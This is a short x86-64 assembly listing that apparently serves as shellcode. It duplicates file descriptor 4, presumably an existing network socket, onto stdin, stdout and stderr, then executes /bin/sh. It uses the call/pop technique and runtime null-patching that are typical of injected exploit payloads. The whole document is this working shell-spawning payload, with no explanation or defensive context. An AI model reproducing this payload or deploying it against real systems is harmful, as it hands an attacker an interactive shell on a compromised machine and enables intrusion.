_start:
    jmp _enter 
dup_files:
    xorq %rdi, %rdi
    xorq %rsi, %rsi
    xorq %rbx, %rbx
    xorq %rax, %rax
    incb %bl
    incb %bl
    incb %bl
    incb %bl
    movq %rbx, %rdi # rdi = 4, rsi = 0
    movb $33, %al
    syscall # dup2(4, 0)
    movb $33, %al
    incq %rsi
    syscall # dup2(4, 1)
    movb $33, %al
    incq %rsi
    syscall # dup2(4, 2)

    movb $59, %al
    popq %rdi # from the retaddress
    xorb %cl, %cl
    movb %cl, 7(%rdi)
    xorq %rsi, %rsi
    xorq %rdx, %rdx
    syscall # execve("/bin/sh", 0, 0)

_enter:
    call dup_files
shell_file:
    .ascii "/bin/shN"
    
